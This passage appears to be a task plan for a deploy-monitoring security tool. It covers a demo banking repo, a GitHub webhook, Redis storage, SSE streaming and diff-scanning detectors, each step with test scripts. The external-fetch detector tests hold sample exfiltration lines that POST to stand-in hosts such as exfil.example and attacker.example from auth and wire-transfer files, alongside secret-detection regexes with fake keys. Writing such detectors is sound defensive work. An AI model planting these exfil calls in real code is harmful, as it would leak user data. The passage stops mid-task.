- `lib/compliance/aml.ts` — AML / sanctions screening stub with `screenCounterparty(name)`
- `lib/db/queries.ts` — typed DB query helpers
- `lib/observability/emit.ts` — `emit(event, payload)` wrapper that calls a *real* internal observability endpoint
- `app/api/wires/initiate/route.ts`, `app/api/wires/approve/route.ts` — wire-transfer init + dual-control approval
- `app/api/admin/wire-override/route.ts` — admin override (the privesc target)
- `app/api/auth/[...nextauth]/route.ts` — NextAuth handler
- `app/(app)/dashboard/page.tsx` — internal ops dashboard
- `components/ui/Button.tsx`, `components/ui/Card.tsx` — dev-3's home turf
- `.github/CODEOWNERS` — per the §"Demo Authors" table
- `package.json`, `README.md`

Push to GitHub as `meridian/core-banking`. Capture URL into `.demo-target-url` and full clone path into `.demo-target-path` (both gitignored).

**Requires:** T0.1.4

**Verify:**

```bash
# tier1_build
node -e "const fs = require('fs'); const u = fs.readFileSync('.demo-target-url','utf8').trim(); if (!u.startsWith('https://')) { console.error('demo-target-url missing or invalid'); process.exit(1); } const p = fs.readFileSync('.demo-target-path','utf8').trim(); if (!fs.existsSync(p)) { console.error('demo-target-path dir missing:', p); process.exit(1); } console.log('OK url=' + u + ' path=' + p)"
```

```bash
# tier2_simplify
DT=$(cat .demo-target-path); echo "Dispatch code-simplifier:code-simplifier on: $DT/lib/auth.ts $DT/lib/auth/session.ts $DT/lib/auth/permissions.ts $DT/lib/wires/transfer.ts $DT/lib/wires/validate.ts $DT/lib/billing/stripe.ts $DT/lib/compliance/aml.ts $DT/lib/db/queries.ts $DT/lib/observability/emit.ts $DT/app/api/wires/initiate/route.ts $DT/app/api/wires/approve/route.ts $DT/app/api/admin/wire-override/route.ts $DT/app/api/auth/[...nextauth]/route.ts $DT/app/(app)/dashboard/page.tsx $DT/components/ui/Button.tsx $DT/components/ui/Card.tsx $DT/.github/CODEOWNERS $DT/package.json"
```

```bash
# tier3_unit
node -e "
const fs = require('fs'); const path = require('path');
const root = require('fs').readFileSync('.demo-target-path','utf8').trim();
const need = [
  'lib/auth.ts','lib/auth/session.ts','lib/auth/permissions.ts',
  'lib/wires/transfer.ts','lib/wires/validate.ts',
  'lib/billing/stripe.ts','lib/compliance/aml.ts',
  'lib/db/queries.ts','lib/observability/emit.ts',
  'app/api/wires/initiate/route.ts','app/api/wires/approve/route.ts',
  'app/api/admin/wire-override/route.ts','app/api/auth/[...nextauth]/route.ts',
  'app/(app)/dashboard/page.tsx',
  'components/ui/Button.tsx','components/ui/Card.tsx',
  '.github/CODEOWNERS','package.json','README.md'
];
const tooSmall = need.filter(p => !fs.existsSync(path.join(root,p)) || fs.statSync(path.join(root,p)).size < 80);
if (tooSmall.length) { console.error('missing or under 80 bytes (likely empty stubs):', tooSmall); process.exit(1); }
const codeowners = fs.readFileSync(path.join(root,'.github/CODEOWNERS'),'utf8');
const ownersChecks = [['lib/auth/','t-okafor'],['lib/wires/','t-okafor'],['app/api/admin/','j-singh'],['lib/observability/','m-rivera'],['lib/billing/','d-park']];
for (const [path_, owner] of ownersChecks) {
  if (!new RegExp('^' + path_.replace(/\\//g,'\\\\/') + '\\\\* @' + owner, 'm').test(codeowners)) {
    console.error('CODEOWNERS missing rule for', path_, '→', owner);
    process.exit(1);
  }
}
const auth = fs.readFileSync(path.join(root,'lib/auth.ts'),'utf8');
if (!/fetch\\(['\"][^'\"]*identity\\.meridian/.test(auth)) { console.error('lib/auth.ts missing legitimate internal fetch — exfil scenario needs an existing fetch to compare against'); process.exit(1); }
console.log('OK ' + need.length + ' files, CODEOWNERS rules verified');
"
```

```bash
# tier4_integration
URL=$(cat .demo-target-url); DT=$(cat .demo-target-path);
# (a) repo reachable on github
curl -fsS -I "$URL" -o /dev/null -w '%{http_code}\n' | grep -E '^(200|301|302)$' > /dev/null
# (b) clone path actually builds (target's own next build succeeds — proves files are real, not stubs)
( cd "$DT" && npx tsc --noEmit -p tsconfig.json > /tmp/meridian-tsc.log 2>&1 ) || { echo "meridian/core-banking does not type-check — files are not real"; tail -30 /tmp/meridian-tsc.log; exit 1; }
# (c) git history shows initial commit pushed
( cd "$DT" && git log --oneline | head -5 | grep -q . ) || { echo "no git history in clone"; exit 1; }
echo "OK reachable + builds + has history"
```

---

## T1 — Backend Skeleton

**Description:** A real GitHub push to `meridian/core-banking` lands as a row on the war room timeline. Build the webhook receiver, KV layer, and SSE endpoint.

### T1.1 — GitHub webhook receiver

#### T1.1.1 — `app/api/webhooks/github/route.ts` with HMAC validation

**Description:** Create the route that accepts POST from GitHub. Validate the `X-Hub-Signature-256` HMAC against `GITHUB_WEBHOOK_SECRET` (env var, set in Vercel project settings). On valid push events, write the raw payload to KV under `deploys:raw:{sha}`. Return 401 on bad signature, 400 on bad JSON, 200 on success.

**Requires:** T0.4.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/api/webhooks/github/route.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./app/api/webhooks/github/route.ts').then(async (m) => { const body = JSON.stringify({ ref: 'refs/heads/main', after: 'abc123' }); const crypto = await import('crypto'); const sig = 'sha256=' + crypto.createHmac('sha256', 'TEST_SECRET').update(body).digest('hex'); process.env.GITHUB_WEBHOOK_SECRET = 'TEST_SECRET'; const req = new Request('http://localhost/webhooks/github', { method: 'POST', headers: { 'x-hub-signature-256': sig, 'x-github-event': 'push', 'content-type': 'application/json' }, body }); const res = await m.POST(req); if (res.status !== 200) { console.error('expected 200, got', res.status); process.exit(1); } const bad = new Request('http://localhost/webhooks/github', { method: 'POST', headers: { 'x-hub-signature-256': 'sha256=deadbeef', 'x-github-event': 'push', 'content-type': 'application/json' }, body }); const res2 = await m.POST(bad); if (res2.status !== 401) { console.error('expected 401 on bad sig, got', res2.status); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t111.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && BODY='{"ref":"refs/heads/main","after":"deadbeef"}' && SECRET=$(grep ^GITHUB_WEBHOOK_SECRET= .env.local | cut -d= -f2-) && SIG="sha256=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$SECRET" -hex | awk '{print $2}')" && curl -fsS -X POST http://localhost:3030/api/webhooks/github -H "Content-Type: application/json" -H "X-GitHub-Event: push" -H "X-Hub-Signature-256: $SIG" -d "$BODY" -o /tmp/t111-resp.txt -w '%{http_code}' | grep -q 200; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T1.1.2 — Configure GitHub webhook on `meridian/core-banking`

**Description:** Use `gh api` (or Settings → Webhooks UI) to add a webhook on `meridian/core-banking`: URL = `<bridge_deploy_url>/api/webhooks/github`, secret = same as `GITHUB_WEBHOOK_SECRET`, events = `push` only, content type = `application/json`.

**Requires:** T1.1.1, T0.2.4

**Verify:**

```bash
# tier1_build
TARGET=$(cat .demo-target-url | sed -E 's|^https://github.com/||;s|/$||'); gh api repos/$TARGET/hooks --jq 'length' | grep -E '^[0-9]+$' > /dev/null
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: scripts/setup-webhook.sh (if extracted as script)"
```

```bash
# tier3_unit
TARGET=$(cat .demo-target-url | sed -E 's|^https://github.com/||;s|/$||'); gh api repos/$TARGET/hooks --jq '.[] | select(.config.url | contains("/api/webhooks/github")) | .id' | grep -E '^[0-9]+$' > /dev/null
```

```bash
# tier4_integration
TARGET=$(cat .demo-target-url | sed -E 's|^https://github.com/||;s|/$||'); HOOK_ID=$(gh api repos/$TARGET/hooks --jq '.[] | select(.config.url | contains("/api/webhooks/github")) | .id' | head -1); gh api repos/$TARGET/hooks/$HOOK_ID/deliveries --jq '.[0].guid' | grep -E '^[a-f0-9-]+$' > /dev/null
```

### T1.2 — Storage layer (Redis)

**Storage backend decision:** This project uses **Redis** (via the `redis` npm package), not Vercel KV REST. Connection via `REDIS_URL` env (set during T0.2.2 via Vercel Marketplace's Redis offering / Upstash / similar). The `lib/db.ts` abstraction exposes a `kv.*` API matching what every downstream verify block already uses (`kv.set / kv.get / kv.list / kv.del`) — same names, redis client underneath.

#### T1.2.1 — `lib/db.ts` with redis client + helpers + key conventions

**Description:** Wrap the `redis` npm client behind a `kv` abstraction. Export `kv.set(key, value)`, `kv.get(key)`, `kv.list(prefix)` (uses `SCAN` with `MATCH prefix*` to enumerate keys; never `KEYS` which blocks production redis), `kv.del(key)`, plus typed wrappers `getDeploy(sha)`, `setDeploy(sha, record)`, `listDeploys(limit)`, `getThreat(id)`, etc. Connection is lazy + memoized at module load — single `createClient` per process, reused across calls. Values are JSON-serialized on write, parsed on read. Document the key schema in a top-of-file comment: `deploys:{sha}` (full record), `deploys:raw:{sha}` (webhook payload), `verdicts:{sha}`, `threats:{id}`, `history:author:{login}`, `history:file:{path}`, `history:cochange:{a}:{b}`, `history:hour:{path}`, `pause_state:{deploy_id}`, `investigator:{deploy_id}:{agent}`, `workflow_cost:{deploy_id}`.

`kv.list(prefix)` returns plain string[]. The `value` argument to `kv.set` is JSON-serialized (objects, arrays, numbers, strings all OK); `kv.get` returns the parsed value (or `null`).

**Requires:** T0.2.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/db.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import { kv, setDeploy, getDeploy } from './lib/db.ts';
import 'dotenv/config';
// Roundtrip
const sha = 't_' + Date.now().toString(36);
await setDeploy(sha, { sha, score: 0.5, tldr: 'unit test record' });
const got = await getDeploy(sha);
if (got?.score !== 0.5) { console.error('roundtrip failed', got); process.exit(1); }
// Object value preserved
await kv.set('test:obj:' + sha, { a: 1, nested: { b: [1, 2, 3] } });
const obj = await kv.get('test:obj:' + sha);
if (obj?.nested?.b?.[2] !== 3) { console.error('object roundtrip failed', obj); process.exit(1); }
// list with prefix
await kv.set('test:list:' + sha + ':a', 1);
await kv.set('test:list:' + sha + ':b', 2);
const list = await kv.list('test:list:' + sha + ':');
if (list.length !== 2) { console.error('expected 2 keys, got', list); process.exit(1); }
// del
await kv.del('deploys:' + sha);
await kv.del('test:obj:' + sha);
await kv.del('test:list:' + sha + ':a');
await kv.del('test:list:' + sha + ':b');
const after = await getDeploy(sha);
if (after !== null) { console.error('del did not remove', after); process.exit(1); }
console.log('OK roundtrip + object + list-prefix + del');
"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "
import { kv, listDeploys } from './lib/db.ts';
import 'dotenv/config';
const out = await listDeploys(5);
if (!Array.isArray(out)) { console.error('listDeploys did not return array'); process.exit(1); }
// Connection re-use: 50 sequential ops should complete in <2s (single connection, not per-call connect)
const t0 = Date.now();
for (let i = 0; i < 50; i++) await kv.get('nonexistent:' + i);
const elapsed = Date.now() - t0;
if (elapsed > 2000) { console.error('50 reads took ' + elapsed + 'ms — likely reconnecting per call'); process.exit(1); }
console.log('OK list len=' + out.length + ' · 50 reads in ' + elapsed + 'ms');
"
```

### T1.3 — SSE endpoint

#### T1.3.1 — `app/api/stream/deploys/route.ts` (SSE)

**Description:** Create an SSE endpoint that polls KV every 1 second and emits `deploy`, `verdict`, `threat_surface`, and `status` events as they appear. Use `ReadableStream` with the `text/event-stream` content type. Track last-seen cursor per connection so we don't replay historical events on every poll.

**Requires:** T1.2.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/api/stream/deploys/route.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./app/api/stream/deploys/route.ts').then(async (m) => { const req = new Request('http://localhost/api/stream/deploys'); const res = await m.GET(req); const ct = res.headers.get('content-type'); if (!ct?.includes('text/event-stream')) { console.error('bad content-type:', ct); process.exit(1); } const reader = res.body.getReader(); const { value } = await Promise.race([reader.read(), new Promise(r => setTimeout(() => r({ value: null }), 1500))]); if (!value) { console.error('no SSE bytes within 1.5s'); process.exit(1); } const txt = new TextDecoder().decode(value); if (!/^(event:|data:|:)/m.test(txt)) { console.error('bad SSE shape:', txt.slice(0, 200)); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t131.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && timeout 4 curl -fsS -N http://localhost:3030/api/stream/deploys | head -c 500 > /tmp/sse-t131.txt; grep -E '^(event:|data:|:)' /tmp/sse-t131.txt > /dev/null; ec=$?; pkill -f 'next dev.*3030' || true; exit $ec
```

#### T1.3.2 — Wire deploy creation to SSE

**Description:** When the webhook (T1.1.1) writes a new `deploys:raw:{sha}` to KV, the SSE poll picks it up on the next tick and emits a `deploy` event. End-to-end: push to demo-target → webhook fires → SSE emits → war room would receive (war-room wiring is T3).

**Requires:** T1.3.1, T1.1.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/api/stream/deploys/route.ts (SSE poll loop)"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ setDeploy, kv }) => { require('dotenv').config({path:'.env.local'}); const sha = 'sse_' + Date.now().toString(36); await setDeploy(sha, { sha, score: 0.7, tldr: 'sse fanout test' }); const list = await kv.list('deploys:'); if (!list.some(k => k.includes(sha))) { console.error('write did not land'); process.exit(1); } await kv.del('deploys:' + sha); console.log('OK'); })"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/dev-t132.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && SHA=int_$(date +%s) && (timeout 6 curl -fsS -N http://localhost:3030/api/stream/deploys > /tmp/sse-t132.txt &) && sleep 1 && npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ setDeploy }) => { require('dotenv').config({path:'.env.local'}); await setDeploy('$SHA', { sha: '$SHA', score: 0.5, tldr: 'integration' }); console.log('wrote'); })" && sleep 4 && grep -q "$SHA" /tmp/sse-t132.txt; ec=$?; pkill -f 'next dev.*3030' || true; npx tsx --input-type=module -e "import('./lib/db.ts').then(async ({ kv }) => { require('dotenv').config({path:'.env.local'}); await kv.del('deploys:$SHA'); })" || true; exit $ec
```

---

## T2 — Pipeline Backbone

**Description:** A real push fans out into real signals → real score → real dashboard row with a real LLM-generated TL;DR. This is the longest task; sub-tasks correspond to raw_prompt §2a–2f.

### T2.1 — Workflow scaffolding

#### T2.1.1 — `workflows/watchdog.ts` with `"use workflow"`

**Description:** Top-level workflow function. Takes `{ sha, repo, before, after, _force_score?, _force_failure? }`, calls ingest → extract-signals → score → summarize → persist. Each call is a step. Returns the final score. Test hooks (used by T4.4.1+ verify blocks): `_force_score: number` bypasses signal extraction and uses the given score directly; `_force_failure: string` causes the named investigator agent to throw, exercising WDK retry/error paths.

**Requires:** T1.3.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/watchdog.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/watchdog.ts').then(({ watchdog }) => { if (typeof watchdog !== 'function') { console.error('watchdog not a function'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/watchdog.ts').then(async ({ watchdog }) => { require('dotenv').config({path:'.env.local'}); const r = await watchdog({ sha: 'noop_test', repo: 'acme/x', before: '0', after: 'noop_test' }).catch(e => ({ err: e.message })); console.log('watchdog returned', JSON.stringify(r).slice(0, 200)); })"
```

#### T2.1.2 — `workflows/steps/ingest.ts` with `"use step"`

**Description:** Fetches diff via Octokit. Returns `{ files: [{path, additions, deletions, patch}], commit_message, author, pushed_at }`. On Octokit failure, throws — WDK will retry.

**Requires:** T2.1.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: workflows/steps/ingest.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./workflows/steps/ingest.ts').then(async ({ ingest }) => { require('dotenv').config({path:'.env.local'}); const out = await ingest({ owner: 'octocat', repo: 'Hello-World', sha: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d' }); if (!out.files || !Array.isArray(out.files)) { console.error('bad shape:', out); process.exit(1); } if (typeof out.author !== 'string') { console.error('missing author'); process.exit(1); } console.log('OK files=' + out.files.length); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./workflows/steps/ingest.ts').then(async ({ ingest }) => { require('dotenv').config({path:'.env.local'}); const out = await ingest({ owner: 'octocat', repo: 'Hello-World', sha: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d' }); if (!out.commit_message) { console.error('no commit message'); process.exit(1); } console.log('OK ' + out.commit_message.slice(0, 60)); })"
```

### T2.2 — Structural signals

#### T2.2.1 — Signal #1: new external `fetch()` / `axios` / `http.request`

**Description:** Add `lib/signals/structural.ts` exporting `detectExternalFetch(file, config?)` where `file = { path, patch, additions, deletions, status }` and `config = { allowlist?: string[] }`. Returns `{ matched: boolean, severity: 0–1, evidence: { url: string, line: number }[] }`. Detection runs ONLY on additions (`+`-prefixed lines, never on `-`-prefixed deletions or context lines). Regex covers: `fetch('https?://...')`, `fetch("https?://...")`, `` fetch(`https?://...`) `` (template literals with hardcoded URL prefix), `axios.(get|post|put|patch|delete|head|options|request)('https?://...')`, `axios('https?://...')`, `axios.create({ baseURL: 'https?://...' })`, `http.request({ ... host: 'evil.example' ... })`, `https.request(...)`. Allowlist supports glob: `*.meridian.internal` matches `identity.meridian.internal` but not `evil.example.com`. Severity = 0.9 if URL not in allowlist AND path is auth/wires/admin, 0.6 if not in allowlist anywhere, 0.0 if in allowlist.

**This stage is the exemplar of the §"Rigor bar" (200-IQ-senior bar). Other signal stages (T2.2.2–T2.2.6) follow the same pattern with case loads scaled to their surface.**

**Requires:** T2.1.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/structural.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import { detectExternalFetch } from './lib/signals/structural.ts';
const cases = [
  // 1. Happy path: textbook exfil
  { name: 'happy: stats-collector POST in auth path', file: { path: 'lib/auth.ts', patch: '+await fetch(\\'https://stats-collector.io/track\\', { method: \\'POST\\' })', additions: 1, deletions: 0, status: 'modified' }, expect: { matched: true, minSeverity: 0.85 } },
  // 2. Negative path: no fetch in patch
  { name: 'negative: pure const assignment', file: { path: 'lib/auth.ts', patch: '+const x = 1;', additions: 1, deletions: 0, status: 'modified' }, expect: { matched: false } },
  // 3. Edge: empty patch
  { name: 'edge: empty patch', file: { path: 'lib/auth.ts', patch: '', additions: 0, deletions: 0, status: 'modified' }, expect: { matched: false } },
  // 4. Edge: deletion-only line (the regex must scan additions only)
  { name: 'edge: removal of a fetch is not a match', file: { path: 'lib/auth.ts', patch: '-await fetch(\\'https://anywhere.com/x\\')', additions: 0, deletions: 1, status: 'modified' }, expect: { matched: false } },
  // 5. Edge: context line containing a fetch (no +/- prefix) must NOT match
  { name: 'edge: context line is not an addition', file: { path: 'lib/auth.ts', patch: ' await fetch(\\'https://anywhere.com/x\\') // unchanged', additions: 0, deletions: 0, status: 'modified' }, expect: { matched: false } },
  // 6. Edge: template-literal URL with hardcoded prefix
  { name: 'edge: template literal w/ hardcoded host', file: { path: 'lib/wires/transfer.ts', patch: '+await fetch(\\`https://exfil.example/path/\\${id}\\`)', additions: 1, deletions: 0, status: 'modified' }, expect: { matched: true } },
  // 7. Edge: axios.create variant
  { name: 'edge: axios.create with baseURL', file: { path: 'lib/db/queries.ts', patch: '+const c = axios.create({ baseURL: \\'https://attacker.example/api\\' })', additions: 1, deletions: 0, status: 'added' }, expect: { matched: true } },
  // 8. Adversarial: a comment that LOOKS like a fetch (regex must not be too greedy)
  { name: 'adversarial: only a comment containing fetch text', file: { path: 'lib/auth.ts', patch: '+// We used to fetch from https://oldhost.example/x but no longer', additions: 1, deletions: 0, status: 'modified' }, expect: { matched: false } },
  // 9. Adversarial: multi-line patch where exfil is in the middle
  { name: 'adversarial: exfil in middle of multi-line patch', file: { path: 'lib/auth.ts', patch: '+function track(uid) {\\n+  console.log(uid);\\n+  return fetch(\\'https://exfil.example/track\\', { method: \\'POST\\' });\\n+}', additions: 4, deletions: 0, status: 'modified' }, expect: { matched: true } },
  // 10. Configuration: allowlist suppresses match for a known-good host
  { name: 'config: allowlisted host does not match', file: { path: 'lib/observability/emit.ts', patch: '+await fetch(\\'https://telemetry.meridian.internal/emit\\')', additions: 1, deletions: 0, status: 'modified' }, expect: { matched: false }, config: { allowlist: ['*.meridian.internal'] } },
  // 11. Configuration: allowlist with default (empty) DOES match the same host
  { name: 'config: default allowlist matches everything not local', file: { path: 'lib/observability/emit.ts', patch: '+await fetch(\\'https://telemetry.meridian.internal/emit\\')', additions: 1, deletions: 0, status: 'modified' }, expect: { matched: true } },
  // 12. Severity escalation: same patch in lib/auth.ts vs lib/utils.ts produces different severity
  { name: 'severity: auth path scores higher than utils path', files: [
    { path: 'lib/auth.ts',   patch: '+await fetch(\\'https://x.example/y\\')', additions: 1, deletions: 0, status: 'modified' },
    { path: 'lib/utils.ts',  patch: '+await fetch(\\'https://x.example/y\\')', additions: 1, deletions: 0, status: 'modified' },
  ], expect: 'auth_higher_than_utils' }
];
let pass = 0, fail = 0;
for (const c of cases) {
  if (c.expect === 'auth_higher_than_utils') {
    const a = detectExternalFetch(c.files[0]); const b = detectExternalFetch(c.files[1]);
    if (a.severity > b.severity && a.matched && b.matched) pass++; else { fail++; console.error('FAIL', c.name, { a, b }); }
    continue;
  }
  const r = detectExternalFetch(c.file, c.config);
  const matchedOk = (r.matched === c.expect.matched);
  const sevOk = (c.expect.minSeverity == null) || (r.severity >= c.expect.minSeverity);
  if (matchedOk && sevOk) pass++; else { fail++; console.error('FAIL', c.name, { got: r, expected: c.expect }); }
}
if (fail > 0) { console.error('FAIL TOTAL ' + fail + '/' + cases.length); process.exit(1); }
console.log('OK ' + pass + '/' + cases.length + ' cases');
"
```

```bash
# tier4_integration
# Cross-stage integration: signal flows through the real extract-signals pipeline AND records evidence with line numbers.
# Failure-mode: malformed patch input must not crash the detector.
npx tsx --input-type=module -e "
import { extractSignals } from './workflows/steps/extract-signals.ts';
import { detectExternalFetch } from './lib/signals/structural.ts';

// (1) Pipeline integration
const ingest = {
  files: [
    { path: 'lib/auth.ts', patch: '+await fetch(\\'https://stats-collector.io/track\\', { method: \\'POST\\' })', additions: 1, deletions: 0, status: 'modified' },
    { path: 'lib/auth/session.ts', patch: '+// untouched comment\\n+const x = 1;', additions: 2, deletions: 0, status: 'modified' }
  ],
  commit_message: 'add metrics emitter', author: 'dev-3', pushed_at: new Date().toISOString()
};
const out = await extractSignals(ingest);
const hits = out.structural?.external_fetch || [];
if (hits.length !== 1) { console.error('expected exactly 1 external_fetch hit through pipeline, got', hits.length, hits); process.exit(1); }
if (!hits[0].evidence?.[0]?.url?.includes('stats-collector.io')) { console.error('evidence missing exfil URL', hits[0]); process.exit(1); }
if (typeof hits[0].evidence[0].line !== 'number') { console.error('evidence missing line number'); process.exit(1); }

// (2) Failure mode: malformed input
const malformed = [
  { path: 'lib/x.ts' /* no patch */ },
  { path: 'lib/x.ts', patch: null, additions: 0, deletions: 0, status: 'modified' },
  { /* no path */ patch: '+await fetch(\\'https://x.example\\')' },
];
for (const m of malformed) {
  try { const r = detectExternalFetch(m); if (r.matched && !m.patch) { console.error('matched on patchless input — false positive', m, r); process.exit(1); } }
  catch (e) { console.error('threw on malformed input — should degrade gracefully:', m, e.message); process.exit(1); }
}

// (3) Idempotence: same input → same output across 3 calls
const file = { path: 'lib/auth.ts', patch: '+await fetch(\\'https://repeat.example/y\\')', additions: 1, deletions: 0, status: 'modified' };
const r1 = JSON.stringify(detectExternalFetch(file));
const r2 = JSON.stringify(detectExternalFetch(file));
const r3 = JSON.stringify(detectExternalFetch(file));
if (r1 !== r2 || r2 !== r3) { console.error('not idempotent', { r1, r2, r3 }); process.exit(1); }

console.log('OK pipeline + failure-mode + idempotence');
"
```

#### T2.2.2 — Signal #2: auth path touched

**Description:** Add `detectAuthPath(file)` to `lib/signals/structural.ts`. Returns matched=true if file path contains any of `auth`, `session`, `token`, `permission`, `middleware` (case-insensitive). Severity proportional to keyword count.

**Requires:** T2.2.1

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/structural.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "import('./lib/signals/structural.ts').then(({ detectAuthPath }) => { if (!detectAuthPath({ path: 'lib/auth.ts' }).matched) { console.error('miss on lib/auth.ts'); process.exit(1); } if (!detectAuthPath({ path: 'middleware.ts' }).matched) { console.error('miss on middleware.ts'); process.exit(1); } if (detectAuthPath({ path: 'components/ui/Button.tsx' }).matched) { console.error('false positive on Button.tsx'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/signals/structural.ts').then(({ detectAuthPath }) => { const r = detectAuthPath({ path: 'lib/auth/session.ts' }); if (r.severity < 0.5) { console.error('expected high severity on auth/session double-keyword path', r); process.exit(1); } console.log('OK sev=' + r.severity); })"
```

#### T2.2.3 — Signal #3: secret-shaped strings

**Description:** Add `detectSecretShapes(file)`. Regex matches: AWS access key ID (`AKIA[0-9A-Z]{16}`), AWS secret (40-char base64-ish), JWT (`eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`), generic API key shape (`(api[_-]?key|secret)\s*[:=]\s*['"][A-Za-z0-9]{20,}['"]`).

**Requires:** T2.2.2

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/structural.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
// Test fixtures use obviously-fake strings that still match Bridge's regex detectors
// but don't trip third-party secret scanners. AWS_KEY = letter A repeated 16x in cleartext.
import { detectSecretShapes } from './lib/signals/structural.ts';
const fakeAws = 'AKIA' + 'A'.repeat(16);                          // 'AKIA' + AAAAAAAAAAAAAAAA
const fakeJwt = 'eyJ' + 'A'.repeat(20) + '.eyJ' + 'B'.repeat(20) + '.' + 'C'.repeat(20);
const cases = [
  { patch: '+const k = \\'' + fakeAws + '\\';', expect: true },
  { patch: '+const t = \\'' + fakeJwt + '\\';', expect: true },
  { patch: '+const x = 1;', expect: false }
];
for (const c of cases) { const r = detectSecretShapes({ patch: c.patch }); if (!!r.matched !== c.expect) { console.error('FAIL', c, r); process.exit(1); } }
console.log('OK');
"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "
// Fake api-key: 32-char alphanumeric, NOT a real provider prefix (avoids GitHub secret-scanner flags)
import { detectSecretShapes } from './lib/signals/structural.ts';
const fakeApiKey = 'FAKEDEMOAPIKEY' + 'X'.repeat(32);
const r = detectSecretShapes({ patch: '+const apiKey = \\'' + fakeApiKey + '\\';' });
if (!r.matched) { console.error('miss on api-key shape'); process.exit(1); }
console.log('OK');
"
```

#### T2.2.4 — Signal #4: critical-path file touched

**Description:** Add `lib/critical-paths.ts` with the critical paths array: `lib/auth*`, `lib/billing*`, `app/api/admin/*`, `app/api/payments/*`, `middleware.ts`, `lib/db/migrations/*`. Add `detectCriticalPath(file, paths?)` to structural.ts that returns matched=true if any path matches the file (with glob support via `minimatch`-style logic).

**Requires:** T2.2.3

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/structural.ts lib/critical-paths.ts"
```

```bash
# tier3_unit
npx tsx --input-type=module -e "Promise.all([import('./lib/signals/structural.ts'), import('./lib/critical-paths.ts')]).then(([{ detectCriticalPath }, { CRITICAL_PATHS }]) => { if (!detectCriticalPath({ path: 'lib/auth.ts' }, CRITICAL_PATHS).matched) { console.error('miss on lib/auth.ts'); process.exit(1); } if (!detectCriticalPath({ path: 'app/api/admin/export/route.ts' }, CRITICAL_PATHS).matched) { console.error('miss on admin/export'); process.exit(1); } if (detectCriticalPath({ path: 'components/ui/Button.tsx' }, CRITICAL_PATHS).matched) { console.error('false positive'); process.exit(1); } console.log('OK'); })"
```

```bash
# tier4_integration
npx tsx --input-type=module -e "import('./lib/critical-paths.ts').then(({ CRITICAL_PATHS }) => { if (!Array.isArray(CRITICAL_PATHS) || CRITICAL_PATHS.length < 4) { console.error('CRITICAL_PATHS too short'); process.exit(1); } console.log('OK len=' + CRITICAL_PATHS.length); })"
```

#### T2.2.5 — Signal #5: new dependency in `package.json` diff

**Description:** Add `detectNewDependency(file)`. Specifically targets `package.json` patches; parses additions for new entries under `"dependencies"` or `"devDependencies"`. Returns `{ matched, severity, evidence: [{name, version}] }`.

**Requires:** T2.2.4

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/signals/structural.ts"
```

```bash
# tier3_unit
